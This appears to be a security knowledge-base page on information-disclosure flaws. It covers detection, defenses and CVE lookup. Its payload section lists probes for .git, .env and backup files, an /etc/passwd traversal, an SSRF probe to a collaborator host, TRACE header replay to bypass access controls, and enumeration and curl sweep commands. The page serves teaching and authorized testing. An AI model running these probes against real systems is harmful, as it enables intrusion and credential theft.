# Information Disclosure

> Leaked errors, comments, backups, or headers reveal sensitive data. **Deep dive:** [`Troubleshooting_Guide/information_disclosure.md`](../../../../Troubleshooting_Guide/information_disclosure.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Aliases / OWASP:** A01:2021 / A05:2021
**Status:** complete

## What it is
Information disclosure is the unintentional exposure of data that aids an attacker — internal data,
secrets, source code, or details about the application's technology and structure. It is rarely
dangerous in isolation but is the reconnaissance that fuels a more serious attack.

## How it works
The leak comes from the application revealing more than it should: verbose error/stack traces that
expose framework versions and SQL, debug pages and config files left deployed, backup or version-control
artifacts (`.bak`, `.git`) served as static files, HTML comments and JavaScript with internal hints,
overly detailed API responses, or headers like `Server` and `X-Powered-By`. The attacker controls only
the requests; the app's misconfiguration or sloppy error handling does the leaking.

## Impact
Disclosed framework versions feed exploit lookup; leaked secrets (API keys, DB credentials, JWT/HMAC
keys, machine keys) directly enable authentication bypass, deserialization, or account takeover; exposed
source reveals further vulnerabilities and hidden endpoints. Standalone severity is usually low-to-medium,
but a leaked credential or key is critical.

## How to detect
- Trigger errors with malformed input (`productId=1'`, type confusion, bad endpoints) and watch for
  stack traces, SQL syntax, file paths, or version banners.
- Probe for left-behind files: `/.git/HEAD`, `/.env`, `/phpinfo.php`, `/backup.zip`, `/WEB-INF/web.xml`.
- Inspect response headers (`Server`, `X-Powered-By`), HTML comments (view-source), `robots.txt`,
  sitemaps, and API docs (`/swagger`, `/openapi.json`) for paths and tech disclosure.

## Exploitation (summary)
Fingerprint the stack from errors and headers, then enumerate hidden paths and backup/source artifacts.
Reconstruct `.git` history to recover secrets that were "removed" but remain in past commits, mine
`phpinfo`/debug pages for keys, and use TRACE to surface internal auth headers you can replay. Chain any
recovered secret or endpoint into the relevant follow-on attack. Full probe lists are in the Payloads
section.

## Payloads & techniques

> Distilled from field payload references — for authorized testing only.

### Vector overview

| Vector | Probes | Look for |
|--------|--------|----------|
| Debug pages | `/phpinfo.php`, `/debug` | `SECRET_KEY`, creds, server paths |
| Error messages | `productId=1'`, bad endpoints | Stack traces, framework versions |
| Backup / source files | `/.bak`, `/backup.zip`, `/WEB-INF/web.xml` | Source code, hardcoded creds |
| `.git` history | `/.git/` | Commits, leaked passwords |
| TRACE method | `TRACE /path` | Internal auth headers |
| robots.txt / sitemap | `GET /robots.txt` | Hidden paths |
| HTML comments | view-source | Debug links, TODOs |
| Swagger / OpenAPI | `/api-docs`, `/swagger` | API endpoints |

### Debug pages & HTML comments

```text
/cgi-bin/phpinfo.php
/phpinfo.php
/info.php
/debug.php
```
Look for `SECRET_KEY`, database credentials, server paths, loaded extensions. View source (`Ctrl+U`) for hidden comments:
```html
<!-- <a href=/cgi-bin/phpinfo.php>Debug</a> -->
<!-- TODO: remove before production -->
<!-- admin panel at /admin -->
```

### Error-message disclosure

Trigger verbose errors to leak SQL syntax, table names, versions, and paths.
```text
# SQL error
/product?productId=1'
/product?productId=-1
/product?productId=999999

# Path traversal
/image?filename=../../../../etc/passwd
/file?path=..\..\..\windows\system32\drivers\hosts

# SSRF / OOB
/api/fetch?url=http://YOUR-COLLABORATOR.oastify.com

# Stack traces
/admin
/wrong-endpoint
/api/v1/missing
```
A framework banner (e.g. `Apache Struts 2 2.3.31`) feeds directly into exploit lookup: `searchsploit Apache Struts 2.3.31`.

### Source-code & backup disclosure

```text
# Generic backups
/backup  /backup.sql  /backup.tar.gz  /backup.zip
/backup.old  /backup.bak  /database.sql  /dump.sql
/.bak  /.backup  /.swp  /.swo

# Language/framework specific
/WEB-INF/web.xml  /index.php.bak  /ProductTemplate.java.bak
/Config.cs  /source  /src  /htdocs
/__pycache__/  /config.py.bak  /.git/
```
```bash
wget https://TARGET/backup/ProductTemplate.java.bak
```
Inspect for hardcoded passwords, API keys, JWT secrets, DB credentials, internal paths.

### Version-control history (`.git`)

```text
/.git/HEAD
/.git/config
/.git/index
```
Dump and mine the repo:
```bash
wget -r https://TARGET/.git
cd TARGET/.git && ls -la
git log
git log -p
git show COMMIT_HASH
git diff HEAD~1
git show HEAD:file
```
Diffs often expose secrets that were "removed" but remain in history:
```text
- ADMIN_PASSWORD=05psjctjzftuafv8menz
+ ADMIN_PASSWORD=env('ADMIN_PASSWORD')
```

### TRACE method (internal header discovery)

```http
TRACE /admin HTTP/1.1
Host: TARGET
```
TRACE reflects all headers, exposing custom auth headers (e.g. `X-Custom-IP-Authorization`). Replay the discovered header to bypass controls:
```http
GET /admin HTTP/1.1
Host: TARGET
X-Custom-IP-Authorization: 127.0.0.1
```

### robots.txt / sitemap

```bash
curl -s https://TARGET/robots.txt
curl -s https://TARGET/sitemap.xml
```
`Disallow` entries advertise hidden paths:
```text
User-agent: *
Disallow: /backup
Disallow: /admin
Disallow: /debug
```

### Directory & endpoint enumeration

```bash
gobuster dir -u https://TARGET/ -w /usr/share/wordlists/dirb/common.txt -t 40
ffuf -u https://TARGET/FUZZ -w wordlist.txt
```
High-value paths and files:
```text
/admin  /Admin  /ADMIN  /api  /api/v1  /api/v2
/console  /debug  /backup  /server-status
/.git  /.git/HEAD  /.git/config  /.gitignore
/.env  /.htaccess  /.htpasswd  /phpinfo.php
```

### API documentation

```text
/api  /api-docs  /docs  /rest
/swagger  /swagger-ui  /swagger.json
/openapi.json  /graphiql  /graphql  /console
```

### Secrets to grep for

```text
SECRET_KEY      ADMIN_PASSWORD   DATABASE_URL
JWT_SECRET      AWS_ACCESS_KEY   AWS_SECRET_KEY
API_KEY         STRIPE_KEY       SENTRY_DSN
```

### cURL recon one-liners

```bash
# Internal headers via TRACE
curl -X TRACE -v https://TARGET/admin

# Response headers / server banner
curl -I https://TARGET/
curl -I https://TARGET/ | grep -i server

# robots.txt
curl -s https://TARGET/robots.txt

# Sweep common paths
for path in /admin /api /debug /phpinfo.php /.git/HEAD /robots.txt; do
  status=$(curl -s -o /dev/null -w "%{http_code}" https://TARGET$path)
  echo "$path -> $status"
done
```

## Defenses
1. **Generic error handling** — show users a generic message; log full stack traces server-side only.
   Disable debug mode and framework error pages in production.
2. **Don't deploy sensitive artifacts** — block/remove `.git`, backups, source, `.env`, and debug pages;
   serve only an explicit allow-list of static paths.
3. **Strip disclosing headers and content** — remove/obfuscate `Server`/`X-Powered-By`, scrub HTML
   comments, and return only the fields each response needs.
4. **Disable risky methods** (TRACE/TRACK) and keep secrets out of source — use a secrets manager and
   rotate any key that has been committed.
5. Review code and config for hardcoded credentials before deployment; treat `.git` history as part of
   the attack surface.

## Finding CVEs from scratch
- **NVD** — https://nvd.nist.gov/vuln/search?query=Information+Disclosure
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=Information+Disclosure
- **Exploit-DB** — https://www.exploit-db.com/search?q=Information+Disclosure
- **GitHub Advisories** — https://github.com/advisories?query=Information+Disclosure
- **OSV** — https://osv.dev/list?q=Information+Disclosure
- **Community** — r/netsec, vendor security blogs, HackerOne Hacktivity, X/Twitter infosec.
- _Query tip: add the target product + version, e.g. `Information Disclosure <product> <version>`._

## Notable CVEs
_Illustrative — verify against NVD before relying on details._
- `CVE-2021-44228` — Log4Shell; verbose logging of attacker input was central, and the surrounding
  disclosure of stack traces/versions aided targeting (primary impact RCE).
- `CVE-2017-5638` — Apache Struts 2 error path leaked details and enabled RCE; framework-banner
  disclosure routinely precedes Struts exploitation.
- _Canonical incident: exposed `.git` directories and `.env` files on production hosts have repeatedly
  leaked AWS keys and DB credentials, a recurring class of bug-bounty findings._

## References
- PortSwigger Web Security Academy — Information disclosure.
- OWASP — Improper Error Handling / Information Leakage cheat sheets; WSTG "Information Gathering".
- OWASP Top 10 — A05:2021 Security Misconfiguration.
